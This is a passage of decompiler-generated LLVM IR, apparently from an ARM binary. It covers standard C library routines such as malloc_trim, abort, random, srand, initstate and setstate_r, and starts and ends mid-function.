  %v0_15f98 = load i32, i32* %r2.global-to-local, align 4
  %v1_15f98 = load i32, i32* %r1.global-to-local, align 4
  %v2_15f98 = add i32 %v1_15f98, 12
  %v3_15f98 = inttoptr i32 %v2_15f98 to i32*
  store i32 %v0_15f98, i32* %v3_15f98, align 4
  %v0_15f9c = load i32, i32* %ip.global-to-local, align 4
  %v1_15f9c = load i32, i32* %r0.global-to-local, align 4
  %v2_15f9c = add i32 %v1_15f9c, %v0_15f9c
  store i32 %v2_15f9c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15fa0

dec_label_pc_15fa0:                               ; preds = %dec_label_pc_15f5c.dec_label_pc_15fa0_crit_edge, %dec_label_pc_15f94
  %v0_15fb0 = phi i32 [ %v0_15fb0.pre, %dec_label_pc_15f5c.dec_label_pc_15fa0_crit_edge ], [ %v2_15f9c, %dec_label_pc_15f94 ]
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_15fa4 = load i32, i32* @r7, align 4
  %v2_15fa4 = add i32 %v0_15fa4, 36
  %v3_15fa4 = inttoptr i32 %v2_15fa4 to i32*
  %v4_15fa4 = load i32, i32* %v3_15fa4, align 4
  %v1_15fa8 = add i32 %v4_15fa4, 52
  store i32 %v1_15fa8, i32* %r3.global-to-local, align 4
  %v1_15fac = add i32 %v4_15fa4, 60
  %v2_15fac = inttoptr i32 %v1_15fac to i32*
  %v3_15fac = load i32, i32* %v2_15fac, align 4
  store i32 %v3_15fac, i32* %r1.global-to-local, align 4
  %v1_15fb0 = or i32 %v0_15fb0, 1
  store i32 %v1_15fb0, i32* %r2.global-to-local, align 4
  %v1_15fb4 = load i32, i32* %r4.global-to-local, align 4
  %v2_15fb4 = add i32 %v1_15fb4, 12
  %v3_15fb4 = inttoptr i32 %v2_15fb4 to i32*
  store i32 %v1_15fa8, i32* %v3_15fb4, align 4
  %v0_15fb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15fb8 = load i32, i32* %r4.global-to-local, align 4
  %v2_15fb8 = add i32 %v1_15fb8, 8
  %v3_15fb8 = inttoptr i32 %v2_15fb8 to i32*
  store i32 %v0_15fb8, i32* %v3_15fb8, align 4
  %v0_15fbc = load i32, i32* %r2.global-to-local, align 4
  %v1_15fbc = load i32, i32* %r4.global-to-local, align 4
  %v2_15fbc = add i32 %v1_15fbc, 4
  %v3_15fbc = inttoptr i32 %v2_15fbc to i32*
  store i32 %v0_15fbc, i32* %v3_15fbc, align 4
  %v0_15fc0 = load i32, i32* %ip.global-to-local, align 4
  %v1_15fc0 = load i32, i32* %r4.global-to-local, align 4
  %v3_15fc0 = add i32 %v1_15fc0, %v0_15fc0
  %v4_15fc0 = inttoptr i32 %v3_15fc0 to i32*
  store i32 %v0_15fc0, i32* %v4_15fc0, align 4
  %v0_15fc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_15fc4 = load i32, i32* %r1.global-to-local, align 4
  %v2_15fc4 = add i32 %v1_15fc4, 12
  %v3_15fc4 = inttoptr i32 %v2_15fc4 to i32*
  store i32 %v0_15fc4, i32* %v3_15fc4, align 4
  %v0_15fc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_15fc8 = load i32, i32* %r3.global-to-local, align 4
  %v2_15fc8 = add i32 %v1_15fc8, 8
  %v3_15fc8 = inttoptr i32 %v2_15fc8 to i32*
  store i32 %v0_15fc8, i32* %v3_15fc8, align 4
  br label %dec_label_pc_15fe0

dec_label_pc_15fd0:                               ; preds = %dec_label_pc_15f44
  %v2_15fd0 = add i32 %v1_15f54, %v0_15fd0
  store i32 %v2_15fd0, i32* %ip.global-to-local, align 4
  %v1_15fd4 = or i32 %v2_15fd0, 1
  store i32 %v1_15fd4, i32* %r3.global-to-local, align 4
  %v0_15fd8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15fd8, i32* %v2_15f4c, align 4
  %v0_15fdc = load i32, i32* %r3.global-to-local, align 4
  %v1_15fdc = load i32, i32* %r4.global-to-local, align 4
  %v2_15fdc = add i32 %v1_15fdc, 4
  %v3_15fdc = inttoptr i32 %v2_15fdc to i32*
  store i32 %v0_15fdc, i32* %v3_15fdc, align 4
  br label %dec_label_pc_15fe0

dec_label_pc_15fe0:                               ; preds = %dec_label_pc_15fa0, %dec_label_pc_15fd0
  %v0_15fe0 = load i32, i32* %ip.global-to-local, align 4
  %v3_15fe4 = icmp ult i32 %v0_15fe0, 131070
  br i1 %v3_15fe4, label %dec_label_pc_16050, label %dec_label_pc_15fe8

dec_label_pc_15fe8:                               ; preds = %dec_label_pc_15fe0
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_15fec = load i32, i32* @r7, align 4
  %v2_15fec = add i32 %v0_15fec, 36
  %v3_15fec = inttoptr i32 %v2_15fec to i32*
  %v4_15fec = load i32, i32* %v3_15fec, align 4
  store i32 %v4_15fec, i32* @r4, align 4
  %v1_15ff0 = inttoptr i32 %v4_15fec to i32*
  %v2_15ff0 = load i32, i32* %v1_15ff0, align 4
  store i32 %v2_15ff0, i32* %r3.global-to-local, align 4
  %v1_15ff4 = and i32 %v2_15ff0, 2
  %v2_15ff4 = icmp eq i32 %v1_15ff4, 0
  br i1 %v2_15ff4, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_15fe8
  store i32 %v4_15fec, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_15fe8, %bb
  %v1_15ffc = xor i1 %v2_15ff4, true
  call void @__pseudo_cond_branch(i1 %v1_15ffc, i32 ptrtoint (i32* @global_var_15ca0.1144 to i32))
  %v0_16000 = load i32, i32* @r4, align 4
  %v1_16000 = add i32 %v0_16000, 44
  %v2_16000 = inttoptr i32 %v1_16000 to i32*
  %v3_16000 = load i32, i32* %v2_16000, align 4
  store i32 %v3_16000, i32* %r3.global-to-local, align 4
  %v1_16004 = add i32 %v3_16000, 4
  %v2_16004 = inttoptr i32 %v1_16004 to i32*
  %v3_16004 = load i32, i32* %v2_16004, align 4
  store i32 %v3_16004, i32* %r3.global-to-local, align 4
  %v1_16008 = add i32 %v0_16000, 836
  %v2_16008 = inttoptr i32 %v1_16008 to i32*
  %v3_16008 = load i32, i32* %v2_16008, align 4
  store i32 %v3_16008, i32* %r2.global-to-local, align 4
  %v1_1600c = and i32 %v3_16004, -4
  store i32 %v1_1600c, i32* %r3.global-to-local, align 4
  %v3_16010 = icmp ult i32 %v1_1600c, %v3_16008
  br i1 %v3_16010, label %dec_label_pc_16050, label %dec_label_pc_16018

dec_label_pc_16018:                               ; preds = %bb17
  store i32 %v0_16000, i32* %r1.global-to-local, align 4
  %v1_1601c = add i32 %v0_16000, 840
  %v2_1601c = inttoptr i32 %v1_1601c to i32*
  %v3_1601c = load i32, i32* %v2_1601c, align 4
  store i32 %v3_1601c, i32* %r0.global-to-local, align 4
  %v2_16020 = call i32 @__malloc_trim(i32 %v3_1601c, i32 %v0_16000)
  store i32 %v2_16020, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16050

dec_label_pc_16028:                               ; preds = %dec_label_pc_15eec
  %v2_16028 = inttoptr i32 %v1_15ebc to i32*
  %v3_16028 = load i32, i32* %v2_16028, align 4
  store i32 %v3_16028, i32* %r0.global-to-local, align 4
  %v1_1602c = add i32 %v4_15eac, 848
  %v2_1602c = inttoptr i32 %v1_1602c to i32*
  %v3_1602c = load i32, i32* %v2_1602c, align 4
  store i32 %v3_1602c, i32* %r2.global-to-local, align 4
  %v1_16030 = add i32 %v4_15eac, 868
  %v2_16030 = inttoptr i32 %v1_16030 to i32*
  %v3_16030 = load i32, i32* %v2_16030, align 4
  %v2_16034 = add i32 %v3_16028, %v1_15eb8
  store i32 %v2_16034, i32* %r1.global-to-local, align 4
  %v1_16038 = add i32 %v3_1602c, -1
  store i32 %v1_16038, i32* %r2.global-to-local, align 4
  %v2_1603c = sub i32 %v3_16030, %v2_16034
  store i32 %v2_1603c, i32* %r3.global-to-local, align 4
  store i32 %v2_1603c, i32* %v2_16030, align 4
  %v1_16044 = load i32, i32* @lr, align 4
  %v2_16044 = add i32 %v1_16044, 848
  %v3_16044 = inttoptr i32 %v2_16044 to i32*
  store i32 %v1_16038, i32* %v3_16044, align 4
  %v0_16048 = load i32, i32* %r0.global-to-local, align 4
  %v1_16048 = load i32, i32* @r5, align 4
  %v2_16048 = sub i32 %v1_16048, %v0_16048
  store i32 %v2_16048, i32* %r0.global-to-local, align 4
  %v4_1604c = call i32 @munmap(i32 %v2_16048, i32 %v2_16034, i32 %v1_16038, i32 %v2_1603c)
  store i32 %v4_1604c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16050

dec_label_pc_16050:                               ; preds = %bb17, %dec_label_pc_15fe0, %dec_label_pc_16018, %dec_label_pc_15ecc, %dec_label_pc_16028
  store i32 %v2_15e60, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v0_1605c = load i32, i32* @r7, align 4
  %v2_1605c = add i32 %v0_1605c, 28
  %v3_1605c = inttoptr i32 %v2_1605c to i32*
  %v4_1605c = load i32, i32* %v3_1605c, align 4
  store i32 %v4_1605c, i32* @ip, align 4
  store i32 90216, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1605c)
  br label %dec_label_pc_16068

dec_label_pc_16068:                               ; preds = %entry, %dec_label_pc_16050
  store i32 %v3_15e54, i32* @r4, align 4
  store i32 %v6_15e54, i32* @r5, align 4
  store i32 %v9_15e54, i32* @r6, align 4
  store i32 %v12_15e54, i32* @r7, align 4
  store i32 %v18_15e54, i32* @lr, align 4
  ret i32 %v2_15e60

; uselistorder directives
  uselistorder i32 %v0_16000, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_15fc0, { 1, 0 }
  uselistorder i32 %v1_15f00, { 1, 0 }
  uselistorder i32 %v0_15f00, { 1, 0 }
  uselistorder i32 %v3_15ed4, { 1, 0 }
  uselistorder i32 %v1_15eb8, { 1, 0, 2 }
  uselistorder i32 %v2_15eb4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_15eac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_15e5c, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_16068, { 1, 0 }
  uselistorder label %dec_label_pc_16050, { 4, 2, 0, 1, 3 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_15fe0, { 1, 0 }
  uselistorder label %dec_label_pc_15fa0, { 1, 0 }
  uselistorder label %dec_label_pc_15f94, { 1, 0 }
  uselistorder label %dec_label_pc_15f90, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15f44, { 1, 0 }
}

define i32 @function_16078(i32 %arg1) local_unnamed_addr {
dec_label_pc_16078:
  %v0_16078 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16078, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16078
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16078, %bb
  %v10_1608c = phi i32 [ %arg1, %dec_label_pc_16078 ], [ 0, %bb ]
  ret i32 %v10_1608c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_16090 = load i32, i32* @r4, align 4
  store i32 %v3_16090, i32* %stack_var_-12, align 4
  %v6_16090 = load i32, i32* @r5, align 4
  %v4_160a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_160a0, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_160a0, i32* @r0, align 4
  %v0_160b0 = call i32 @__malloc_consolidate()
  %v0_160b4 = load i32, i32* @r4, align 4
  %v0_160b8 = load i32, i32* @r5, align 4
  %v2_160c0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_160c0, i32* @r4, align 4
  store i32 %v6_16090, i32* @r5, align 4
  %v2_160c4 = call i32 @__malloc_trim(i32 %v0_160b4, i32 %v0_160b8)
  %v0_160c8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_160c8, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_160cc = phi i32 [ %v2_160c4, %entry ], [ 0, %bb ]
  ret i32 %v4_160cc

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r5, align 4
  %v4_160e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 20) to i32*), align 4
  store i32 90356, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_160e8)
  %v2_16104 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v6_16110 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_16104, i32 0, i32 32)
  %v0_16118 = load i32, i32* @r5, align 4
  %v2_16118 = add i32 %v0_16118, 26484
  %v3_16118 = inttoptr i32 %v2_16118 to i32*
  %v4_16118 = load i32, i32* %v3_16118, align 4
  %v2_1611c = icmp eq i32 %v4_16118, 0
  br i1 %v2_1611c, label %dec_label_pc_16124, label %dec_label_pc_16164

dec_label_pc_16124:                               ; preds = %entry
  store i32 1, i32* %v3_16118, align 4
  br label %dec_label_pc_1612c

dec_label_pc_1612c:                               ; preds = %dec_label_pc_16174, %dec_label_pc_16124
  %v0_16130 = load i32, i32* @r5, align 4
  %v2_16130 = add i32 %v0_16130, 1100
  store i32 %v2_16130, i32* @r4, align 4
  %v2_1613c = add i32 %v0_16130, 40
  %v3_1613c = inttoptr i32 %v2_1613c to i32*
  %v4_1613c = load i32, i32* %v3_1613c, align 4
  call void @__pseudo_branch(i32 %v4_1613c)
  %v1_1614c = call i32 @__GI_raise(i32 6)
  %v0_16158 = load i32, i32* @r5, align 4
  %v2_16158 = add i32 %v0_16158, 20
  %v3_16158 = inttoptr i32 %v2_16158 to i32*
  %v4_16158 = load i32, i32* %v3_16158, align 4
  store i32 90468, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16158)
  %v0_16168.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16164

dec_label_pc_16164:                               ; preds = %entry, %dec_label_pc_1612c
  %v1_1617c = phi i32 [ %v0_16118, %entry ], [ %v0_16168.pre, %dec_label_pc_1612c ]
  %v2_16168 = add i32 %v1_1617c, 26484
  %v3_16168 = inttoptr i32 %v2_16168 to i32*
  %v4_16168 = load i32, i32* %v3_16168, align 4
  %v7_1616c = icmp eq i32 %v4_16168, 1
  br i1 %v7_1616c, label %dec_label_pc_16174, label %dec_label_pc_161b0

dec_label_pc_16174:                               ; preds = %dec_label_pc_16164
  %v2_16174 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_16174, i32* @r4, align 4
  store i32 2, i32* %v3_16168, align 4
  store i32 20, i32* @r2, align 4
  %v2_1618c = bitcast i32* %stack_var_-28 to i8*
  %v3_1618c = call i32 @__GI_memset(i8* %v2_1618c, i32 0)
  %v3_161a8 = call i32 @__libc_sigaction(i32 6, i32 %v2_16174, i32 0)
  br label %dec_label_pc_1612c

dec_label_pc_161b0:                               ; preds = %dec_label_pc_16164
  %v7_161b0 = icmp eq i32 %v4_16168, 2
  br i1 %v7_161b0, label %dec_label_pc_161b8, label %dec_label_pc_161c4

dec_label_pc_161b8:                               ; preds = %dec_label_pc_161b0
  store i32 3, i32* %v3_16168, align 4
  %v0_161c0 = call i32 @abort()
  %v0_161c4.pre = load i32, i32* @r5, align 4
  %v1_161c4.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_161c4

dec_label_pc_161c4:                               ; preds = %dec_label_pc_161b0, %dec_label_pc_161b8
  %v3_161d0 = phi i32 [ 26484, %dec_label_pc_161b0 ], [ %v1_161c4.pre, %dec_label_pc_161b8 ]
  %v2_161d0 = phi i32 [ %v1_1617c, %dec_label_pc_161b0 ], [ %v0_161c4.pre, %dec_label_pc_161b8 ]
  %v2_161c4 = add i32 %v2_161d0, %v3_161d0
  %v3_161c4 = inttoptr i32 %v2_161c4 to i32*
  %v4_161c4 = load i32, i32* %v3_161c4, align 4
  %v7_161c8 = icmp eq i32 %v4_161c4, 3
  br i1 %v7_161c8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_161c4
  store i32 4, i32* %v3_161c4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_161c4, %bb
  call void @__pseudo_cond_branch(i1 %v7_161c8, i32 ptrtoint (i32* @global_var_120a0.1153 to i32))
  br label %dec_label_pc_161dc

dec_label_pc_161dc:                               ; preds = %dec_label_pc_161dc, %.thread2
  %v0_161dc = call i32 @abort()
  br label %dec_label_pc_161dc

; uselistorder directives
  uselistorder i32* %v3_16168, { 1, 0, 2 }
  uselistorder i32 ()* @abort, { 2, 1, 5, 4, 6, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_sigprocmask, { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 20) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_161c4, { 1, 0 }
  uselistorder label %dec_label_pc_16164, { 1, 0 }
}

define i32 @function_161e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_161e8:
  %v0_161e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_161e8, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_161e8
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_161e8, %bb
  %v4_161f4 = phi i32 [ %arg1, %dec_label_pc_161e8 ], [ 0, %bb ]
  ret i32 %v4_161f4

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_16200 = call i32 @random()
  ret i32 %v0_16200
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_16210 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r4, align 4
  %v4_16240 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_16240)
  %v0_16254 = load i32, i32* @r4, align 4
  %v2_16254 = add i32 %v0_16254, 20
  %v3_16254 = inttoptr i32 %v2_16254 to i32*
  %v4_16254 = load i32, i32* %v3_16254, align 4
  store i32 ptrtoint (i32* @global_var_16260.1159 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16254)
  %v2_16264 = ptrtoint i32* %stack_var_-20 to i32
  %v0_16268 = load i32, i32* @r4, align 4
  %v2_16268 = add i32 %v0_16268, 1276
  %v2_1626c = inttoptr i32 %v2_16268 to i32*
  %v3_1626c = call i32 @__GI_random_r(i32* %v2_1626c, i32 %v2_16264)
  %v0_1627c = load i32, i32* @r4, align 4
  %v2_1627c = add i32 %v0_1627c, 28
  %v3_1627c = inttoptr i32 %v2_1627c to i32*
  %v4_1627c = load i32, i32* %v3_1627c, align 4
  call void @__pseudo_branch(i32 %v4_1627c)
  %v3_16288 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_16210, i32* @r4, align 4
  ret i32 %v3_16288
}

define i32 @function_1629c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1629c:
  %v0_1629c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1629c, label %.thread3, label %.thread4

.thread3:                                         ; preds = %dec_label_pc_1629c
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_1629c
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v4_162e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_162e4)
  %v0_162f8 = load i32, i32* @r6, align 4
  %v2_162f8 = add i32 %v0_162f8, 20
  %v3_162f8 = inttoptr i32 %v2_162f8 to i32*
  %v4_162f8 = load i32, i32* %v3_162f8, align 4
  call void @__pseudo_branch(i32 %v4_162f8)
  %v0_16308 = load i32, i32* @r6, align 4
  %v2_16308 = add i32 %v0_16308, 1276
  %v0_16310 = load i32, i32* @r5, align 4
  %v1_16314 = add i32 %v0_16308, 1284
  %v2_16314 = inttoptr i32 %v1_16314 to i32*
  %v3_16314 = load i32, i32* %v2_16314, align 4
  store i32 %v3_16314, i32* @r4, align 4
  %v2_16318 = inttoptr i32 %v2_16308 to i32*
  %v3_16318 = call i32 @setstate_r(i32 %v0_16310, i32* %v2_16318)
  %v1_16320 = icmp slt i32 %v3_16318, 0
  %v3_16330 = load i32, i32* @r4, align 4
  %v4_16330 = add i32 %v3_16330, -4
  %storemerge = select i1 %v1_16320, i32 0, i32 %v4_16330
  %v0_16334 = load i32, i32* @r6, align 4
  %v2_16334 = add i32 %v0_16334, 28
  %v3_16334 = inttoptr i32 %v2_16334 to i32*
  %v4_16334 = load i32, i32* %v3_16334, align 4
  call void @__pseudo_branch(i32 %v4_16334)
  ret i32 %storemerge
}

define i32 @function_16354(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16354:
  %v0_16354 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16354, label %.thread3, label %.thread4

.thread3:                                         ; preds = %dec_label_pc_16354
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_16354
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v4_163a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_163a4)
  %v0_163b8 = load i32, i32* @r4, align 4
  %v2_163b8 = add i32 %v0_163b8, 20
  %v3_163b8 = inttoptr i32 %v2_163b8 to i32*
  %v4_163b8 = load i32, i32* %v3_163b8, align 4
  call void @__pseudo_branch(i32 %v4_163b8)
  %v0_163c8 = load i32, i32* @r6, align 4
  %v0_163cc = load i32, i32* @r4, align 4
  %v2_163cc = add i32 %v0_163cc, 1276
  %v0_163d0 = load i32, i32* @r7, align 4
  %v0_163d4 = load i32, i32* @sl, align 4
  store i32 %v0_163d4, i32* @r0, align 4
  %v1_163d8 = add i32 %v0_163cc, 1284
  %v2_163d8 = inttoptr i32 %v1_163d8 to i32*
  %v3_163d8 = load i32, i32* %v2_163d8, align 4
  store i32 %v3_163d8, i32* @r5, align 4
  %v4_163dc = inttoptr i32 %v0_163d4 to i32*
  %v5_163dc = call i32 @__GI_initstate_r(i32* %v4_163dc, i32 %v0_163c8, i32 %v0_163d0, i32 %v2_163cc)
  %v0_163ec = load i32, i32* @r4, align 4
  %v2_163ec = add i32 %v0_163ec, 28
  %v3_163ec = inttoptr i32 %v2_163ec to i32*
  %v4_163ec = load i32, i32* %v3_163ec, align 4
  call void @__pseudo_branch(i32 %v4_163ec)
  %v0_163f8 = load i32, i32* @r5, align 4
  %v1_163f8 = add i32 %v0_163f8, -4
  ret i32 %v1_163f8
}

define i32 @function_16414(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16414:
  %v0_16414 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16414, label %.thread3, label %.thread4

.thread3:                                         ; preds = %dec_label_pc_16414
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_16414
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_1642c = load i32, i32* @r4, align 4
  %v6_1642c = load i32, i32* @r5, align 4
  %v9_1642c = load i32, i32* @r6, align 4
  %v15_1642c = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r4, align 4
  %v2_16440 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 1124), i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_1645c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_1645c)
  %v0_16470 = load i32, i32* @r4, align 4
  %v2_16470 = add i32 %v0_16470, 20
  %v3_16470 = inttoptr i32 %v2_16470 to i32*
  %v4_16470 = load i32, i32* %v3_16470, align 4
  call void @__pseudo_branch(i32 %v4_16470)
  %v0_16480 = load i32, i32* @r6, align 4
  store i32 %v0_16480, i32* @r0, align 4
  %v0_16484 = load i32, i32* @r4, align 4
  %v2_16484 = add i32 %v0_16484, 1276
  %v2_16488 = inttoptr i32 %v0_16480 to i32*
  %v3_16488 = call i32 @srandom_r(i32* %v2_16488, i32 %v2_16484)
  %v0_1649c = load i32, i32* @r4, align 4
  %v2_1649c = add i32 %v0_1649c, 28
  %v3_1649c = inttoptr i32 %v2_1649c to i32*
  %v4_1649c = load i32, i32* %v3_1649c, align 4
  call void @__pseudo_branch(i32 %v4_1649c)
  store i32 %v3_1642c, i32* @r4, align 4
  store i32 %v6_1642c, i32* @r5, align 4
  store i32 %v9_1642c, i32* @r6, align 4
  store i32 %v15_1642c, i32* @lr, align 4
  ret i32 %v2_16440
}

define i32 @function_164b8(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_164b8:
  %v0_164b8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_164b8, label %.thread3, label %.thread4

.thread3:                                         ; preds = %dec_label_pc_164b8
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_164b8
  %tmp = ptrtoint i32* %arg1 to i32
  ret i32 %tmp
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_164d0 = load i32, i32* @r4, align 4
  store i32 %v3_164d0, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_164d8 = add i32 %tmp, 12
  %v2_164d8 = inttoptr i32 %v1_164d8 to i8*
  %v3_164d8 = load i8, i8* %v2_164d8, align 1
  %v4_164d8 = zext i8 %v3_164d8 to i32
  store i32 %v4_164d8, i32* %r1.global-to-local, align 4
  %v2_164dc = icmp eq i8 %v3_164d8, 0
  store i1 %v2_164dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_164dc, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v1_164e412 = add i32 %arg1, 4
  store i32 %v1_164e412, i32* %r6.global-to-local, align 4
  %v1_164e813 = add i32 %tmp, 8
  %v2_164e814 = inttoptr i32 %v1_164e813 to i32*
  %v3_164e815 = load i32, i32* %v2_164e814, align 4
  store i32 %v3_164e815, i32* %r0.global-to-local, align 4
  %v3_16504 = add i32 %v3_164e815, -4
  %v4_16504 = inttoptr i32 %v3_16504 to i32*
  store i32 %v4_164d8, i32* %v4_16504, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_164e0 = add i32 %tmp, 4
  %v3_164e0 = inttoptr i32 %v2_164e0 to i32*
  %v4_164e0 = load i32, i32* %v3_164e0, align 4
  %v1_164e4 = add i32 %arg1, 4
  store i32 %v1_164e4, i32* %r6.global-to-local, align 4
  %v1_164e8 = add i32 %tmp, 8
  %v2_164e8 = inttoptr i32 %v1_164e8 to i32*
